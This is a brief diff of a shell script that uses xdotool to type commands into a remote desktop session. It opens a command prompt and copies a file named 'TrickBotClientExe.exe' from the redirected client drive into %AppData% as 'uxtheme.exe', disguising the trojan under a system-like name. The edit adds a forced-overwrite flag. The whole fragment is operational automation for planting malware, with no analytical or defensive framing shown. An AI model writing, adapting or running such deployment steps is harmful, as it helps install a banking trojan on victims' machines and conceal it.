@@ -336,7 +336,7 @@
           xdotool windowactivate --sync "$rdp_window" key Super_L;
           sleep 5; xdotool windowactivate --sync "$rdp_window" type --delay 200 "cmd.exe";
           sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
-          sleep 10; xdotool windowactivate --sync "$rdp_window" type --delay 200 'copy \\tsclient\X\TrickBotClientExe.exe %AppData%\uxtheme.exe';
+          sleep 10; xdotool windowactivate --sync "$rdp_window" type --delay 200 'copy \\tsclient\X\TrickBotClientExe.exe %AppData%\uxtheme.exe /Y';
           sleep 1; xdotool windowactivate --sync "$rdp_window" key Return;
           sleep 15; xdotool windowactivate --sync "$rdp_window" type --delay 200 "cd %AppData%";
           sleep 1; xdotool windowactivate --sync "$rdp_window" key Return;
